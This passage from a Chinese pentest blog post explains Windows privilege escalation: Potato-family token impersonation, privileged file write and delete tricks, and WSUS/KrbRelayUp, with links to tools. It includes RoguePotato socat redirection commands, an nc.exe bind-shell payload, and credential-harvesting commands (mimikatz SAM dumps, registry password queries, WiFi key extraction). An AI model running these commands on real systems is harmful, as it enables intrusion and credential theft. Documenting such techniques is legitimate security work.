      <li>Windows Defender 病毒定义更新： BITS 用于后台更新 Windows Defender 病毒定义。</li>
      <li>应用程序和系统更新： 第三方应用程序和系统组件可以利用 BITS 进行后台更新。</li>
    </ol>
  </li>
  <li>
    <h2 id="clsid是标识-com-类对象的全局唯一标识符它是一个类似uuid的标识符">CLSID是标识 COM 类对象的全局唯一标识符。它是一个类似UUID的标识符。</h2>
  </li>
</ol>

<h3 id="juicy-potato">Juicy Potato</h3>
<p>Rotten Potato 的 PoC 使用了 COM 来激活 BITS 服务。Windows 在修补 Rotten Potato 时，禁用了 BITS 服务，并且占用了 6666 端口，但该修补并不能完全杜绝这类问题，作者找到了其他可以选择的 COM 对象，也可以发起 NTLM 请求。</p>

<p>其具体利用过程与 Rotten Potato 类似：</p>
<ol>
  <li>Juicy Potato 通过传递 BITS 的 CLSID 和 IStorage 对象实例给 CoGetInstanceFromIStorage 函数，使得 rpcss 激活 BITS 服务。</li>
  <li>随后 rpcss 的 DCOM OXID resolver 会解析序列化数据中的 OBJREF 拿到DUALSTRINGARRAY 字段，该字段指定了 host[port] 格式的 location，绑定对象时会向其中的 host[port] 发送 DEC/RPC 请求，这时，如果攻击者控制了这个端口，就可以要求进行 NTLM 身份验证，那么高权限服务就会发送 net-NTLM 进行认证。</li>
  <li>其后的过程与 Rotten Potato 一致</li>
</ol>

<p>影响范围：</p>
<ul>
  <li>&lt; Windows 10 1809</li>
  <li>&lt; Windows Server 2019</li>
</ul>

<h3 id="pipe-potatoprintspoofer">Pipe Potato（PrintSpoofer）</h3>
<p><strong>命名管道提权原理</strong>：
windows 中有一个 API ImpersonateNamedPipeClient()，允许服务端进程对连接到它的客户端进程进行模拟。通过调用 ImpersonateNamedPipeClient()，命名管道服务端可以模拟命名管道客户端的安全上下文，从而直接将命名管道服务端当前线程的 Token 令牌更改为命名管道客户端的 Token令牌。</p>

<p>因此命名管道提权的原理大多类似，一般是诱使 system 权限的服务访问我们创建的命名管道。</p>

<p><strong>PrintSpoofer 原理</strong>：</p>

<p>Windows 的 MS-RPRN 协议用于打印客户机和打印服务器之间的通信，默认情况下启用。同时，Print Spooler 服务的 RPC 接口暴露在命名管道：\.\pipe\spoolss 中，该服务默认开启。</p>

<p>MS-RPRN 协议定义的 RpcRemoteFindFirstPrinterChangeNotificationEx() 函数创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端，并且就是通过命名管道实现进程之间的通信。</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">RpcRemoteFindFirstPrinterChangeNotificationEx</span><span class="p">(</span> 
    <span class="cm">/* [in] */</span> <span class="n">PRINTER_HANDLE</span> <span class="n">hPrinter</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwFlags</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwOptions</span><span class="p">,</span>
    <span class="cm">/* [unique][string][in] */</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">pszLocalMachine</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">dwPrinterLocal</span><span class="p">,</span>
    <span class="cm">/* [unique][in] */</span> <span class="n">RPC_V2_NOTIFY_OPTIONS</span> <span class="o">*</span><span class="n">pOptions</span><span class="p">)</span>

</code></pre></div></div>
<p>其中 pszLocalMachine 是指向表示客户端计算机名称的字符串的指针，需要传递一个 UNC 路径，传递 \127.0.0.1 时，服务器会访问 \127.0.0.1\pipe\spoolss，但这个管道已经被系统注册了，并由 NT AUTHORITY\SYSTEM 控制。如果我们传入是 \127.0.0.1\pipe\demo， spoolsv.exe 进程也会对Server name做了校验，最后还是会替换成 \192.168.110.137\pipe\spools 管道。</p>

<p>作者在这里利用了 windows UNC 路径规范化的技巧绕过了这个限制</p>

<p>考虑到 UNC 路径的性质，如果主机名包含 /，它将通过路径检查，但真正连接的时候会转化为 \ 。那么，如果传递一个 \127.0.0.1/pipe/foo，检查时会认为 127.0.0.1/pipe/foo 是一个主机名，随后在连接 named pipe 时会对参数做标准化，于是就会连接 \127.0.0.1\pipe\foo\pipe\spoolss，那么攻击者就可以把主机名改为 \127.0.0.1/pipe/foo 并注册这个 named pipe 从而窃取 client 的 token。</p>

<p>利用工具：</p>
<ul>
  <li><a href="https://github.com/itm4n/PrintSpoofer">itm4n/PrintSpoofer: Abusing impersonation privileges through the “Printer Bug”</a></li>
</ul>

<p>参考：</p>
<ul>
  <li><a href="https://paper.seebug.org/2090/">Windows 命名管道客户端模拟和 PrintSpoofer 原理探究</a></li>
</ul>

<h3 id="bad-potato">Bad Potato</h3>
<p>BadPotato是C#版本的PrintSpooler，结构代码也更加简化，并且恶意管道服务端用的是对方机器的名字，而PrintSpooler用的是随机生成的UUID，pipePotato则是固定的”xxx”（导致可用性也更低）</p>

<p>利用工具：</p>
<ul>
  <li><a href="https://github.com/BeichenDream/BadPotato">BeichenDream/BadPotato: Windows 权限提升 BadPotato</a></li>
</ul>

<h3 id="rogue-potato">Rogue Potato</h3>
<p>为了修补 Juicy Potato，高版本的 Windows DCOM 解析器不允许 OBJREF 中的 DUALSTRINGARRAY 字段指定端口号。</p>

<p><strong>利用条件：</strong></p>
<ol>
  <li>我们需要有一台机器在我们的控制之下，我们可以在其中执行重定向，并且受害者必须可以在端口 135上访问该机器</li>
  <li>我们需要上传两个 exe 文件，当受害者的防火墙不接受传入连接时，也可以在我们控制的 Windows 机器上以独立模式启动伪造的 OXID 解析器</li>
</ol>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120041332.png" alt="20231120041332" /></p>

<p>利用思路：</p>
<ol>
  <li>
    <p>Rogue Potato 的利用思路是在远程服务器的 135 端口上做一个转发，用于将 OXID 解析请求重定向到一个假的OXID RPC 服务器。</p>
  </li>
  <li>
    <p>伪造的OXID RPC 服务器实现了ResolveOxid2服务器过程，该过程将指向受控命名管道[ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]</p>
  </li>
  <li>
    <p>DCOM 服务器将连接到 RPC 服务器以执行 IRemUnkown2 接口调用。通过连接到命名管道，将执行”身份验证回调”，我们可以通过 RpcImpersonateClient()调用模拟调用者。</p>
  </li>
  <li>
    <p>然后,令牌窃取者
  1.获取rpcss服务的PID
  2.打开进程，列出所有句柄，并为每个句柄尝试复制它并获取句柄类型
  3.如果句柄类型为”Token”且令牌所有者为 SYSTEM，则尝试使用CreatProcessAsUser()或CreateProcessWithToken()模拟并启动进程</p>
  </li>
</ol>

<p><strong>影响范围：</strong></p>
<ul>
  <li>&gt;= Windows 10 1809 &amp; Windows Server 2019</li>
</ul>

<p>利用工具：</p>
<ul>
  <li>https://github.com/antonioCoco/RoguePotato</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Network redirector / port forwarder to run on your remote machine, must use port 135 as src port</span>
socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999

<span class="c"># RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. </span>
<span class="c"># Use this if you have fw restrictions.</span>
RoguePotato.exe <span class="nt">-r</span> 10.0.0.3 <span class="nt">-e</span> <span class="s2">"C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span>

<span class="c"># RoguePotato all in one with RogueOxidResolver running locally on port 9999</span>
RoguePotato.exe <span class="nt">-r</span> 10.0.0.3 <span class="nt">-e</span> <span class="s2">"C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">-l</span> 9999

<span class="c">#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename</span>
RoguePotato.exe <span class="nt">-r</span> 10.0.0.3 <span class="nt">-e</span> <span class="s2">"C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">-l</span> 9999 <span class="nt">-c</span> <span class="s2">"{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}"</span> <span class="nt">-p</span> splintercode
</code></pre></div></div>

<h3 id="efspotatopetitpotam">EfsPotato（PetitPotam）</h3>
<p>利用EFSRPC（加密文件系统远程协议），进行NTLM中继攻击可实现AD域内权限提升或本地权限提升。</p>

<p>影响范围：
    Windows Server, version 20H2 (Server Core Installation)
    Windows Server, version 2004 (Server Core installation)
    Windows Server 2019  (Server Core installation)
    Windows Server 2019
    Windows Server 2016  (Server Core installation)
    Windows Server 2016
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 (Server Core installation)
    Windows Server 2012
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for x64-based Systems Service Pack 2
    Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for 32-bit Systems Service Pack 2
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2008 R2 for x64-based Systems Service Pack 1</p>

<p>利用工具：</p>
<ul>
  <li><a href="https://github.com/zcgonvh/EfsPotato">zcgonvh/EfsPotato: Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).</a></li>
  <li><a href="https://github.com/bugch3ck/SharpEfsPotato">bugch3ck/SharpEfsPotato: Local privilege escalation from SeImpersonatePrivilege using EfsRpc.</a></li>
</ul>

<h3 id="ghost-potatoms08-068-绕过">Ghost potato（MS08-068 绕过）</h3>
<p>为防止用户 relay 本机，在 lsass 中添加缓存绕过，如果缓存中有 (Challenge,cifs/B) 就会认证失败。
然而这个 (Challenge,cifs/B) 是有时效性的（300s），所有只要等 300s 再发送 type3 就可以 bypass 了。</p>

<p>用修改后的 impacket https://shenaniganslabs.io/files/impacket-ghostpotato.zip 可以直接打，用法和MS08-068 类似。</p>

<h3 id="sweet-potato">Sweet Potato</h3>
<p>集成了前面几种土豆触发 NTLM 认证的方式，包括：COM，WinRM，Spoolsv，其中 WInRM 的攻击原理参考：https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/</p>

<p>大致思路就是当 WinRM 在当前系统未启用时，攻击者监听本机 5985 端口，BITS 服务会向 WinRM 5985 发起 NTLM 认证。</p>

<ul>
  <li>RottenPotato</li>
  <li>Weaponized JuciyPotato with BITS WinRM discovery</li>
  <li>PrintSpoofer discovery and original exploit</li>
  <li>EfsRpc built on EfsPotato</li>
  <li>PetitPotam</li>
</ul>

<p>利用工具：<a href="https://github.com/CCob/SweetPotato">CCob/SweetPotato: Local Service to SYSTEM privilege escalation from Windows 7 to Windows 10 / Server 2019</a></p>

<h3 id="generic-potato">Generic Potato</h3>

<p>SweetPotato 的修改版本， 是@micahvandeusen 用于支持通过 HTTP 和/或命名管道模拟身份验证。</p>

<p>这允许从 SSRF 和/或文件写入进行本地权限升级。 在以下情况下它很方便：</p>

<ol>
  <li>我们有权访问的用户拥有 SeImpersonatePrivilege</li>
  <li>系统没有运行打印服务，这会阻止 SweetPotato 。</li>
  <li>WinRM 正在运行以防止 RogueWinRM</li>
  <li>您不允许对您控制的任何计算机进行出站 RPC，并且禁用 BITS 服务以防止 RoguePotato 。</li>
</ol>

<p>利用工具：</p>
<ul>
  <li><a href="https://github.com/micahvandeusen/GenericPotato">micahvandeusen/GenericPotato: Impersonating authentication over HTTP and/or named pipes.</a></li>
</ul>

<h3 id="juicypotatong">JuicyPotatoNG</h3>
<ul>
  <li><a href="https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/">Giving JuicyPotato a second chance: JuicyPotatoNG – Decoder’s Blog</a></li>
</ul>

<p>利用工具：</p>
<ul>
  <li><a href="https://github.com/antonioCoco/JuicyPotatoNG">antonioCoco/JuicyPotatoNG: Another Windows Local Privilege Escalation from Service Account to System</a></li>
</ul>

<h3 id="godpotato">GodPotato</h3>
<p>影响范围：</p>
<ul>
  <li>Windows Server 2012 - Windows Server 2022</li>
  <li>Windows8 - Windows 11</li>
</ul>

<p>利用工具：</p>
<ul>
  <li><a href="https://github.com/BeichenDream/GodPotato">BeichenDream/GodPotato</a></li>
</ul>

<h3 id="靶场">靶场</h3>
<ul>
  <li>Juicy Potato - HackTheBox-Jeeves</li>
  <li>Rogue Potato - HackTheBox-Remote</li>
</ul>

<p>参考：</p>
<ul>
  <li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">Potatoes - Windows Privilege Escalation · Jorge Lajara Website</a></li>
  <li><a href="https://www.geekby.site/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/#2-hot-potato">Potato 家族提权分析 - Geekby’s Blog</a></li>
  <li><a href="https://blog.csdn.net/qq_42045349/article/details/118225426">【精选】Rotten/Juicy Potato提权工原理分析_rottenpotato-CSDN博客</a></li>
  <li><a href="http://moonflower.fun/index.php/2022/05/01/329/">Potato 家族提权学习</a></li>
  <li><a href="https://blog.csdn.net/qq_41874930/article/details/108825010">NTLM-relay攻击的原理与实现</a></li>
  <li><a href="https://paper.seebug.org/2090/">Windows 命名管道客户端模拟和 PrintSpoofer 原理探究</a></li>
</ul>

<h2 id="通过特权文件写入提权">通过特权文件写入提权</h2>
<h3 id="diaghub">DiagHub</h3>
<blockquote>
  <p>从版本 1903 及更高版本开始，DiagHub 不能再用于加载任意 DLL。</p>
</blockquote>

<p>Microsoft 诊断中心标准收集器服务 (DiagHub) 是一项收集跟踪信息并通过 DCOM 以编程方式公开的服务。</p>

<p>该 DCOM 对象可用于将 DLL 加载到 SYSTEM 进程中，前提是该 DLL 存在于 C:\Windows\System32 目录中。</p>

<p>利用步骤：</p>
<ol>
  <li>创建一个邪恶的 DLL 例如：payload.dll 并将其移至 C:\Windows\System32</li>
  <li>build https://github.com/xct/diaghub</li>
  <li>diaghub.exe c:\ProgramData\ Payload.dll</li>
</ol>

<p>默认有效负载将运行 C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe</p>

<h3 id="usodllloader">UsoDLLLoader</h3>
<blockquote>
  <p>2020-06-06 更新：此技巧不再适用于最新版本的 Windows 10 Insider Preview。</p>
</blockquote>

<p>如果我们在 Windows 或某些第三方软件中发现特权文件写入漏洞，我们可以将自己版本的 windowscoredeviceinfo.dll 复制到 C:\Windows\Sytem32\中，然后让 USO 服务以 NT AUTHORITY\System 的身份加载它。</p>

<p>利用步骤：</p>
<ol>
  <li>构建 https://github.com/itm4n/UsoDllLoader
    <ol>
      <li>选择发布配置和 x64 架构。</li>
      <li>构建解决方案。
        <ol>
          <li>DLL .\x64\Release\WindowsCoreDeviceInfo.dll</li>
          <li>加载程序.\x64\Release\UsoDllLoader.exe。</li>
        </ol>
      </li>
    </ol>
  </li>
  <li>将 WindowsCoreDeviceInfo.dll 复制到 C:\Windows\System32\</li>
  <li>使用加载程序并等待 shell 或运行 usoclient StartInteractiveScan 并连接到端口 1337 上的绑定 shell。</li>
</ol>

<h3 id="wertrigger">WerTrigger</h3>
<p>利用 Windows 问题报告写入特权。</p>

<p>利用步骤：</p>
<ol>
  <li>克隆 https://github.com/sailay1996/WerTrigger</li>
  <li>将 phoneinfo.dll 复制到C:\Windows\System32\</li>
  <li>将 Report.wer 文件和 WerTrigger.exe 放在同一目录中。</li>
  <li>然后，运行 WerTrigger.exe。</li>
  <li>享受 NT AUTHORITY\SYSTEM 的 shell</li>
</ol>

<h3 id="wermgr">WerMgr</h3>
<p>利用 Windows 错误报告的特权目录创建错误达成提权</p>

<p>利用步骤：</p>
<ol>
  <li>Clone https://github.com/binderlabs/DirCreate2System</li>
  <li>Create directory C:\Windows\System32\wermgr.exe.local\</li>
  <li>Grant access to it: cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f</li>
  <li>Place spawn.dll file and dircreate2system.exe in a same directory and run .\dircreate2system.exe.</li>
  <li>Enjoy a shell as NT AUTHORITY\SYSTEM</li>
</ol>

<h2 id="通过特权文件删除提权">通过特权文件删除提权</h2>
<p>在 MSI 安装期间，Windows Installer 服务会维护每个更改的记录，以防需要回滚，为此它将创建：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> C:\Config.Msi 中的文件夹包含
     回滚脚本 (.rbs)
     回滚文件 (.rbf)
</code></pre></div></div>

<p>要将特权文件删除转换为本地权限提升，您需要滥用 Windows Installer 服务。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Windows Installer 创建受保护的 C:\Config.Msi 文件夹后立即将其删除
 重新创建具有弱 DACL 权限的 C:\Config.Msi 文件夹，因为普通用户可以在 C:\ 根目录下创建文件夹。
 将恶意 .rbs 和 .rbf 文件放入其中，以便由 MSI 回滚执行
 然后在回滚时，Windows Installer 将对系统进行任意更改
</code></pre></div></div>

<p>触发此链的最简单方法是使用 zdi/FilesystemEoPs/FolderOrFileDeleteToSystem。  该漏洞利用包含一个具有 2 个操作的 .msi 文件，第一个操作会产生延迟，第二个操作会引发错误以使其回滚。  此回滚将“恢复”C:\Program Files\Common Files\microsoft shared\ink\HID.dll 中的恶意 HID.dll。</p>

<p>然后使用 [CTRL]+[ALT]+[DELETE] 切换到安全桌面并打开屏幕键盘 (osk.exe)。  osk.exe进程首先查找C:\Program Files\Common Files\microsoft共享\ink\HID.dll库而不是C:\Windows\System32\HID.dll</p>

<h1 id="windows-域内提权">Windows 域内提权</h1>
<h2 id="wsus">WSUS</h2>
<p>WSUS 是微软推出的免费的 Windows 更新管理服务，当我们获得了WSUS服务器的控制权限后，可以通过推送补丁的方式进行横向移动。这个利用方法最早公开在BlackHat USA 2015。</p>

<p>利用工具</p>
<ul>
  <li>https://github.com/nettitude/SharpWSUS</li>
  <li>https://github.com/AlsidOfficial/WSUSpendu</li>
  <li>https://github.com/ThunderGunExpress/Thunder_Woosus</li>
</ul>

<p>以上三个工具的实现原理基本相同，都是创建一个调用psexec执行命令的补丁，将补丁推送至指定计算机，等待目标计算机更新补丁</p>

<ul>
  <li><a href="https://www.4hou.com/shop/posts/nJAP">嘶货</a></li>
</ul>

<h2 id="krbrelayup">KrbRelayUp</h2>
<p>CVE-2022–26923 域内提权漏洞。</p>

<p>这本质上是在不强制执行 LDAP 签名（默认设置）的 Windows 域环境中的通用无修复本地权限升级。</p>

<p>这意味着每台域内 Windows 主机都只要未更改默认设置并强制执行 LDAP 签名设置，就容易受到攻击。这种利用方式不需要拥有管理员权限。</p>

<ul>
  <li><a href="https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html">No-Fix Local Privilege Escalation Using KrbRelay With Shadow Credentials - Icyguider’s Blog</a></li>
  <li><a href="https://wwwgeneral.github.io/posts/from-unprivileged-user-to-system-krbrelayup/">From unprivileged user to system - KrbRelayUp - wwwGeneral</a></li>
</ul>

<h1 id="参考资料">参考资料</h1>
<ul>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords">PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings</a></li>
  <li><a href="https://www.freebuf.com/articles/web/281863.html">手把手教你Windows提权 - FreeBuf网络安全行业门户</a></li>
  <li><a href="https://github.com/alphaSeclab/windows-security/blob/master/Readme_full.md#f39e40e340f61ae168b67424baac5cc6">windows-security/Readme_full.md at master · alphaSeclab/windows-security</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="Pentest" /><category term="windows" /><category term="LPE" /><category term="Info gathering" /><summary type="html"><![CDATA[Windows 本地提权 利用导出或查找密码提权 主要思路在于使用 mimikatz 或者从配置文件、注册表项中排查密码。 SAM and SYSTEM files(win10 及以下) 安全帐户管理器 (SAM)，通常是安全帐户管理器，是一个数据库文件。 用户密码以哈希格式存储在注册表配置单元中，作为 LM 哈希或 NTLM 哈希。 该文件位于 %SystemRoot%/system32/config/SAM 中，并安装在 HKLM/SAM 上。 # Usually %SYSTEMROOT% = C:\Windows %SYSTEMROOT%\repair\SAM %SYSTEMROOT%\System32\config\RegBack\SAM %SYSTEMROOT%\System32\config\SAM %SYSTEMROOT%\repair\system %SYSTEMROOT%\System32\config\SYSTEM %SYSTEMROOT%\System32\config\RegBack\system 直接使用 mimikatz 提取即可，无需使用 pwddump HiveNightmare(Windows 10 and 11) 不影响 Server。 CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user 使用 icacls 命令检查漏洞是否存在 C:\Windows\System32&gt; icacls config\SAM config\SAM BUILTIN\Administrators:(I)(F) NT AUTHORITY\SYSTEM:(I)(F) BUILTIN\Users:(I)(RX) &lt;-- this is wrong - regular users should not have read access! Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it. mimikatz&gt; token::whoami /full # List shadow copies available mimikatz&gt; misc::shadowcopies # Extract account from SAM databases mimikatz&gt; lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM # Extract secrets from SECURITY mimikatz&gt; lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY 【漏洞复现】CVE-2021-36934 Windows 提权漏洞复现 - TeamsSix 搜索文件内容中的 password 在 .xml, .ini, .txt .config 等文件中搜索 Password cd C:\ &amp; findstr /SI /M "password" *.xml *.ini *.txt findstr /si password *.xml *.ini *.txt *.config 2&gt;nul &gt;&gt; results.txt findstr /spin "password" *.* 在远程地址例如 SMB Shares 或 SharePoint 搜索 Search passwords in SharePoint: nheiniger/SnaffPoint (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6) # First, retrieve a token ## Method 1: using SnaffPoint binary $token = (.\GetBearerToken.exe https://your.sharepoint.com) ## Method 2: using AADInternals Install-Module AADInternals -Scope CurrentUser Import-Module AADInternals $token = (Get-AADIntAccessToken -ClientId "9bc3ab49-b65d-410a-85ad-de819febfddc" -Tenant "your.onmicrosoft.com" -Resource "https://your.sharepoint.com") # Second, search on Sharepoint ## Method 1: using search strings in ./presets dir .\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token ## Method 2: using search string in command line ### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference .\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token -l -q "filename:.config" Search passwords in SMB Shares: SnaffCon/Snaffler 搜索和 password 相关的文件名 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* where /R C:\ user.txt where /R C:\ *.ini 搜索和 password 相关的注册表 REG QUERY HKLM /F "password" /t REG_SZ /S /K REG QUERY HKCU /F "password" /t REG_SZ /S /K reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2&gt;nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s 在 unattend.xml 中搜索密码 自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。 Location of the unattend.xml files. C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattend\Unattend.xml C:\Windows\system32\sysprep.inf C:\Windows\system32\sysprep\sysprep.xml Display the content of these files with dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul. Example content &lt;component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64"&gt; &lt;AutoLogon&gt; &lt;Password&gt;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==&lt;/Password&gt; &lt;Enabled&gt;true&lt;/Enabled&gt; &lt;Username&gt;Administrateur&lt;/Username&gt; &lt;/AutoLogon&gt; &lt;UserAccounts&gt; &lt;LocalAccounts&gt; &lt;LocalAccount wcm:action="add"&gt; &lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt; &lt;Group&gt;administrators;users&lt;/Group&gt; &lt;Name&gt;Administrateur&lt;/Name&gt; &lt;/LocalAccount&gt; &lt;/LocalAccounts&gt; &lt;/UserAccounts&gt; Unattend credentials are stored in base64 and can be decoded manually with base64. $ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d SecretSecurePassword1234* The Metasploit module post/windows/gather/enum_unattend looks for these files. Unattended Installs提权 - zpchcbd - 博客园 IIS Web config 中的密码 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config C:\inetpub\wwwroot\web.config 其他可能存在凭证的文件 %SYSTEMDRIVE%\pagefile.sys %WINDIR%\debug\NetSetup.log %WINDIR%\repair\sam %WINDIR%\repair\system %WINDIR%\repair\software, %WINDIR%\repair\security %WINDIR%\iis6.log %WINDIR%\system32\config\AppEvent.Evt %WINDIR%\system32\config\SecEvent.Evt %WINDIR%\system32\config\default.sav %WINDIR%\system32\config\security.sav %WINDIR%\system32\config\software.sav %WINDIR%\system32\config\system.sav %WINDIR%\system32\CCM\logs\*.log %USERPROFILE%\ntuser.dat %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat %WINDIR%\System32\drivers\etc\hosts C:\ProgramData\Configs\* C:\Program Files\Windows PowerShell\* dir c:*vnc.ini /s /b dir c:*ultravnc.ini /s /b Wifi 密码 Find AP SSID netsh wlan show profile Get Cleartext Pass netsh wlan show profile &lt;SSID&gt; key=clear Oneliner method to extract wifi passwords from all the access point. cls &amp; echo. &amp; for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" &amp; echo.) &amp; @echo on 注意，该一句话仅对英文系统有用，中文系统需要修改匹配字段。 便笺中存放的密码 The sticky notes app stores it’s content in a sqlite db located at C:\Users&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite 服务中存放的密码 Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1 Import-Module path\to\SessionGopher.ps1; Invoke-SessionGopher -AllDomain -o Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss Key Manager 中存放的密码 This software will display its output in a GUI 下面的命令将打开 windows 凭据管理器。 rundll32 keymgr,KRShowKeyMgr Powershell 历史记录中存放的密码 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt cat (Get-PSReadlineOption).HistorySavePath cat (Get-PSReadlineOption).HistorySavePath | sls passw 关闭 ps 历史记录 Set-PSReadlineOption -HistorySaveStyle SaveNothing Powershell Transcript 文件 C:\Users\&lt;USERNAME&gt;\Documents\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt C:\Transcripts\&lt;DATE&gt;\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt 备用数据流（ADS）中的密码 ADS 是添加到新技术文件系统（也称为 NT 文件系统 (NTFS)）中的功能，以提高与 Macintosh 分层文件系统 (HFS) 的可比性。 例如在 notepad 中编辑但未保存到文件的数据。 PS &gt; Get-Item -path flag.txt -Stream * PS &gt; Get-Content -path flag.txt -Stream Flag LAPS Settings Extract HKLM\Software\Policies\Microsoft Services\AdmPwd from Windows Registry. LAPS Enabled: AdmPwdEnabled LAPS Admin Account Name: AdminAccountName LAPS Password Complexity: PasswordComplexity LAPS Password Length: PasswordLength LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled 进程相关提权方式 哪些进程在运行 tasklist /v net start sc query Get-Service Get-Process Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize 哪些进程以 system 权限运行 tasklist /v /fi "username eq system" 如果这些进程所在目录，或加载的 dll 所在目录可写的话，可利用 dll 劫持提权。 Powershell 版本 REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion 